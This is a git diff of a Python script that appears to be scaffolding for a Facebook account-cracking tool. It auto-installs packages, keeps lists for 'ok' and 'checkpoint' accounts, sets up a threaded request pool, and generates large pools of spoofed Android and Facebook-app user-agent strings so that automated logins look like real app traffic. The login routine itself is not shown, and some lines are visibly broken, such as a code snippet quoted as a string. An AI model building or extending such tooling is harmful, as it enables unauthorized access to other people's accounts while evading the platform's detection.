@@ -1,494 +1,398 @@
-#inception-09
-fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
+#__________________[ IMPORT ]__________________#
+import os,zlib
+from os import system as osRUB
+from os import system as cmd
+os.system('clear')
+print(f'\x1b[38;5;46m[\x1b[38;5;160m◆\x1b[38;5;46m] INSTALL MODEL WAITING.... ') 
+try:
+    import requests,certifi,rich, pycurl 
+except:
+    os.system("pip install requests certifi rich pycurl")
+    import requests,certifi,rich,pycurl
+    
+try:
+    import concurrent.futures
+except ImportError:
+    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING FUTURES ')
+    os.system('pip install futures')
+try:
+    import mechanize
+except ModuleNotFoundError:
+    os.system('pip install mechanize > /dev/null')
 
 try:
-	import os,requests,json,time,re,random,sys,uuid,string,subprocess
-	from string import *
-	import bs4
-	from concurrent.futures import ThreadPoolExecutor as tred
-	from bs4 import BeautifulSoup as sop
-	from bs4 import BeautifulSoup
-	os.system('git pull -q')
-except ModuleNotFoundError: 
-	print('\n Installing missing modules ...')
-	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python xbow.py')
-try:
-	ah = os.listdir('/sdcard')
-	if ['Android'] in ah:pass
-except:print(' \n allow storage permission ...!');time.sleep(1);os.system('termux-setup-storage');exit()
+    import rich
+except:
+    os.system("pip install rich")
+    import rich
 
-W = '\033[97;1m'
-R = '\033[91;1m'
-G = '\033[92;1m'
-Y = '\033[93;1m'
-B = '\033[94;1m'
-P = '\033[95;1m'
-S = '\033[96;1m'
-IPGD ='\33[1;32m'
+from rich.progress import track
 
-# modl chks
-print(' checking modules...!')
+def looood(MACHINE):
+    for i in track(range(500),description=MACHINE):
+        time.sleep(0.01)
+        
+from urllib.request import Request, urlopen
+import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
+from concurrent.futures import ThreadPoolExecutor as Habib
+from string import * 
+from random import randint
+from time import sleep as slp
+from os import system as cmd
+from zlib import decompress 
+import os, platform
+from concurrent.futures import ThreadPoolExecutor
+fast_work = ThreadPoolExecutor(max_workers=15).submit
+#__________________[ LOOP ]__________________#
+totaldmp = 0
+count = 0
+loop = 0
+oks = []
+cps = []
+id = []
+ps = []
+sid = []
+total=[]
+methods = []
+srange = 0
+saved = []
+totaldmp = 0
+filter = []
+loop,ok,cp,user = 0,[],[],[]
+cok,plist = [],[]
 
+#__________xbow_UA_ZONE____________#
+build = random.choice(['OPD2302.','SP1A.','TP2A.','SP1A.','SP1A.','TP1A.','TP1A.','SP1A.','TP1A.','RKQ1.','TP1A.','TP1A.','RP1A.','RP1A.','RKQ1.','TQ3A.','TD2A.','TD4A.','TQ3A.','TP1A.','TP1A.','SP2A.','SD2A.','SQ3A.','RD2A.','RQ3A.','RP1A.','QD4A.','QQ3A.','QP1A.','PQ3B.','PD2A.','PPR2.','PPR1.','OPM8.','OPR6.'])
+realme = random.choice(['RMX3930','RMX6703','RMX8344','RMX9941','RMX4876','RMX4709','RMX0432','RMX7073','RMX5796','RMX8529','RMX3142','RMX5579','RMX0664','RMX6912','RMX1242','RMX5158','RMX5376','RMX1542','RMX0978','RMX9174'])
+fbks = random.choice(['orca-Andorid','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
+FBPKG2 = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
+viviom = random.choice(['V2057A','I2208','V2228','V1922A','V1916A','V1930A','vivo Y55A','vivo Y55A','I2018','vivo 1707','V2168A','V2228','V1836A','V1930A','V2057A','vivo 1707','V2121A','V2121A','V2147','V1824A'])
+company = random.choice(['archos','sony','samsung','vivo','oppo','realme','redmi','xiaomi','galaxy','itel'])
+sony = random.choice(['XQCT62-B','xperia 1 iv','SM-A137F','V2043','CPH2363','RMX3511','M1908C3JH','SM-A135F','itel S661L'])
+newmod = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
+model = random.choice(['SM-A047F','SM-A047M','SM-A127M','SM-A127F','SM-A135F','SM-A135U','SM-A135M','SM-A135N','SM-A137F','SM-A135U1','SM-A136U','SM-A136W','SM-A136B','SM-A136S','SM-A136M','SM-A136U1','SM-S136DL','SM-A145MB','SM-A145FB','SM-A225M','SM-A225F','SC-56B','SM-A235N','SM-A235F','SM-A235M','SM-A236U','SM-A236B','SM-A236M','SM-A236E','SM-A236U1','SM-A2360','SM-A236V','SM-S236DL','SM-A233C','SC-56C','SCG18','SM-A245F','SM-A245M','SM-A245N','SM-A325M','SM-A325F','SM-A325N','SM-A326K','SM-A326BR','SM-A326B','SM-A326U','SM-A326W','SCG08','SM-S326DL','SM-A326U1','SM-A336B','SM-A336E','SM-A336M','SM-A3360','SM-A336N','SM-A346N','SM-A3460','SM-A346E','SM-A346B','SM-A346M','SM-A426N','SM-S426DL','SM-A426U1','SM-A426U','SM-A515F','SM-A515U','SM-A515W','SM-A515U1','SM-S515DL','SM-A516N','SM-A516B','SM-A5160','SM-A516V','SCG07','SC-54A','SM-A516U','SM-A516U1','SM-A525F','SM-A525M','SM-A526U','SC-53B','SM-A526W','SM-A526B','SM-A5260','SM-A526U1','SM-A528B','SM-A528N'])
+samsung_models = random.choice(['samsung s22 s','galaxy s7','galaxy s8','galaxy s9','galaxy s10','galaxy note 5','galaxy note 8','galaxy note 9','galaxy a5','galaxy a7','galaxy j5','s22 ultra'])
 
-gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
-ugen=[]
-for xd in range(10000):
-	aa='Mozilla/5.0 (Linux; U; Android'
-	b=random.choice(['6','7','8','9','10','11','12','13'])
-	c=f' en-us; {str(gt)}'
-	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mobile Safari/537.36'
-	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
-	ugen.append(uaku2)
-for agent in range(10000):
-	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-	b=random.choice(['6','7','8','9','10','11','12','13'])
-	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.randrange(1, 999)
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mobile Safari/533.1'
-	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-	ugen.append(fullagnt)
-rug=[]
-for nt in range(10000):
-	rr=random.randint
-	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	rx=random.randrange(1, 999)
-	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
-	rug.append(xx)
-ruz=[]
-for mtc in range(10000):
-	rr=random.randint
-	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
-	ruz.append(xd)
+#━━━━━━━━━━━[ FILE-UA] ━━━━━━━━━━━ 
+
+def S1():
+	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','en_BD','en_IN','en_AF'])
+	application_version = str(random.randint(111,444))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,33))
+	ver = str(random.randrange(30,443))
+	app_version = str(random.randint(111,444))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,33))
+	app_ver_code=str(random.randint(000000000,999999999))
+	application_version_code=str(random.randint(111111111,999999999))
+	fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113','241.0.0.43.15'])
+	fbcr = "random.choice(['o2 - de', 'Verizon - us', 'Vodafone - uk','null','en_GB','en_US','en_PK','IND airtel','Nepal Telecom'])}"
+	s = "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
+	e = '[FBAN/FB4A;FBAV/65.0.0.42.81;FBBV/23239543;FBDM/{density=3.0,width=1080,height=1920};FBLC/pl_PL;FBCR/Nokia;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;]'
+	ua = s + e
+	#print(ua)
+	return ua 
+
 	
-#new ua
-ugen=[]
-for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-        b=random.choice(['6','7','8','9','10','11','12'])
-        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/533.1'
-        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-        ugen.append(fullagnt)
+def S2():
+	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','en_BD','en_IN','en_AF'])
+	application_version = str(random.randint(111,444))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,33))
+	ver = str(random.randrange(30,443))
+	app_version = str(random.randint(111,444))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,33))
+	app_ver_code=str(random.randint(000000000,999999999))
+	application_version_code=str(random.randint(111111111,999999999))
+	fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113','241.0.0.43.15'])
+	fbcr = "random.choice(['o2 - de', 'Verizon - us', 'Vodafone - uk','null','en_GB','en_US','en_PK','IND airtel','Nepal Telecom'])}"
+	s = "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
+	e = '[FBAN/FB4A;FBAV/189.0.0.45.140;FBBV/3098847;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBRV/3098847;FBCR/Robi;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X693;FBSV/9.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]' 
+	ua = s + e
+	#print(ua)
+	return ua 
 
-sim_id = ''
-android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
-model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
-build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
-fblc = 'en_GB'
-try:
-        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
-except:
-        fbcr = 'Banglalink'
-fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
-fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
-fbdv = model
-fbsv = android_version
-fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
-fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
-try:
-        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
-        total = 0
-        for i in fbcr:
-                total+=1
-        select = ('1','2')
-        if select == '1':
-                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
-                sim_id+=fbcr
-        elif select == '2':
-                try:
-                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
-                        sim_id+=fbcr
-                except Exception as e:
-                        fbcr = "Banglalink"
